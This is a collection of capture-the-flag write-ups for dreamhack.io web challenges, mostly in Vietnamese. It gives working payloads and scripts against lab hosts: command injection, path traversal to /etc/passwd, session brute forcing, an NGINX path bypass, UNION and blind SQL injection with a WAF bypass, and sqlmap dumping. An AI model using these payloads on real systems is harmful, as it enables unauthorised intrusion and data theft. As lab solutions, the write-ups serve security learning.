# dreamhack.io
## Beginner
### php7cmp4re
```
input1=7.:&input2=7:
```
### phpreg
```
step1: input1=dnyanyangng0310&input2=1@43319!+1+13 
step2: cat /../dream/*
```
### ex-reg-ex
```
import re
i = "drabcdde123am@xyz.com"
m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', i)
print(m)
```
### Flying Chars
- Read src for win
### simple-web-request
- Read src and request for win

![image](https://github.com/user-attachments/assets/07441982-8730-4cdc-9491-e224b34fb5e9)

![image](https://github.com/user-attachments/assets/e46ec44a-fb38-41af-b5e5-b6834625743e)

### devtools-sources
- Dont need devtools i need a penguin
```grep -r "DH{" *```
### session

- Ở đây server phân biệt người dùng này với người dùng khác qua session_id. 
- Tuy nhiên độ dài của nó khá ngắn nên chúng ta có thể bf ra được.

![image](https://github.com/user-attachments/assets/4ed8bf4a-4263-49e8-ae56-b7653d5f75f7)

- Mình sẽ dùng brup để bf:

```
GET / HTTP/1.1
Host: host3.dreamhack.games:10491
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://host3.dreamhack.games:10491/login
Accept-Encoding: gzip, deflate, br
Cookie: sessionid=§i§
Connection: keep-alive
```

![image](https://github.com/user-attachments/assets/f65d445a-37a8-4552-bcba-6c885ca35c5b)

![image](https://github.com/user-attachments/assets/b7f2f260-2c44-427b-8f80-e6d8a63472f4)

### Carve Party
- Click bằng tay đi.
```js
for(i=0; i<=10000; i++){
 $('#jack-target').trigger("click")
}
```
### web-misconf-1
- config quên xóa default password
```
user: admin
pass: admin
```
### command-injection-1
- Server chạy subprocess nhưng không kiểm tra đầu vào của input:
```
ping -c 3 "{input}"
-> input = ";cat *;echo "
-> ping -c 3 ""; cat *; echo ""
```

### file-download-1
- không cần care phần upload đâu, đọc src sẽ thấy ```/read``` bị lỗi path traversal.
```
http://host3.dreamhack.games:24186/read?name=../../../../etc/passwd
tự thêm phần mà bạn muốn đọc vào để solve :v
```
### pathtraversal
- tương tự câu trên nhưng lần này là ở POST data.
```
 const users = {
    'guest': 0,
    'admin': 1
  }
userid=1/../../../api/flag
```
### cookie
```Cookie: sessionid=6c292920; username=admin```
## Level 1
### baby-Case
- muốn lấy được flag thì phải vào /shop, nhưng NGINX đã chặn path này.

  ![image](https://github.com/user-attachments/assets/ed349cc1-2ceb-474d-b815-57c48ea3716b)

- Chúng ta có thể lợi dụng việc sử lý URL của Express và NGINX để bypass ```/shop = /sHOP```
- Tiếp theo là bypass hàm ```search``` bằng cách thêm một kí tự lowcase vào data.

![image](https://github.com/user-attachments/assets/ee084983-0396-4a90-b253-9529a465ebe0)

```
POST /sHop HTTP/1.1
Host: host3.dreamhack.games:16045
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

leg=FlAG
```
### simple-phparse
- URLencode for win
```http://host3.dreamhack.games:13101/fl%61g.php```

### what-is-my-ip
- Chúng ta sẽ sử dụng ```X-Forwarded-For``` để kiểm soát input của IP.

![image](https://github.com/user-attachments/assets/515bbc02-e412-405b-9019-e58dcf1c25dd)

```X-Forwarded-For:$(cd ../; cat flag)```

### BypassIF
- Bài này vẫn là CMDinjection nhưng có thêm timeout.

![image](https://github.com/user-attachments/assets/5cca85b7-0b88-404e-9946-fc83b294b1e0)

- Nếu chúng ta cho server ```Sleep 10``` thì sẽ có key của admin.

### baby-union
- script kiddie go bruh bruh
```sqlmap -u http://host3.dreamhack.games:24120/ --data "uid=a&upw=a" --dump```
- hoặc
```uid='+UNION+SELECT+sflag,+sclose,sname+,+svalue+FROM+onlyflag--+-&upw=a```

### Type c-j
- Nếu m đọc tới đây, thì t biết là m đã bất lực.
- Tin t đi không làm ra đâu.
  ```input1=0000000000&input2=356abcde```
### Broken Buffalo Wings
```/flag.txt = win ???????????``` 
### random-test
```py

from string import ascii_lowercase, digits
import requests

url = "http://host3.dreamhack.games:24531/"
alphabet = ascii_lowercase + digits
pw = ''

for y in range(4):
    for x in alphabet:
        res = requests.post(
            url, data={'locker_num': pw+str(x), 'password': 100})
        if "Good" in res.text:
            pw += str(x)
            print(f" {y} pw: {pw}")
            break
for x in range(100, 201):
    res = requests.post(url, data={'locker_num': pw, 'password': x})
    if "FLAG" in res.text:
        print(res.text)
        break
```
### amocafe
```
def org():
    FLAG ='DH{55f2394156567886667940273839575eb0af4b3f115345f0cc8b9}'
    menu_str = ''
    # org = 2002760202557848382
    #org = 0x1bcb3bcb0bbffb3e
    org = FLAG[10:29]
    org = int(org)

    print(f'org: {org}')
    st = ['' for i in range(16)]

    for i in range (0, 16):
        res = (org >> (4 * i)) & 0xf
        if 0 < res < 12:
            if ~res & 0xf == 0x4:
                st[16-i-1] = '_'
            else:
                st[16-i-1] = str(res)
        else:
            st[16-i-1] = format(res, 'x')
    menu_str = menu_str.join(st)
    return menu_str
def menu():
    menu = '1_c_3_c_0__ff_3e'

    menu = list(menu)

    for i, d in enumerate(menu):
        # '_'이면 11(b)로 저장
        if d == '_':
            menu[i] = 'b'
        elif d == 'c':
            menu[i] = 'c'
        elif d == 'd':
            menu[i] = 'd'
        elif d == 'e':
            menu[i] = 'e'
        elif d == 'f':
            menu[i] = 'f'
    s = ''.join(str(s) for s in menu)
    return(int(s, 16))
menu_str = org()
org = menu()
print(f'org: {org}')
```

### simple_sqli_chatgpt
- Câu này thật sự có thể solve bằng Chatgpt =))
### command-injection-chatgpt
- y chang câu trên
### sql injection bypass WAF
- OR = ||
- AND = &&
- admin = reverse(\"nimda\")
- Boolean based Blind SQL Injection để đoán từng kí tự của passwd
```py
import requests

flag = ""
for i in range(1,50):
    for j in range(32, 128):
        url = "http://host3.dreamhack.games:21783/?uid='||uid%3Dreverse(\"nimda\")%26%26if(ascii(substr(upw%2C{}%2C1))%3D{}%2Ctrue%2Cfalse)%23".format(i,j)

        res = requests.get(url)
        if 'admin' in res.text:
            flag += chr(j)
            print(flag)
```
### out of money
- 
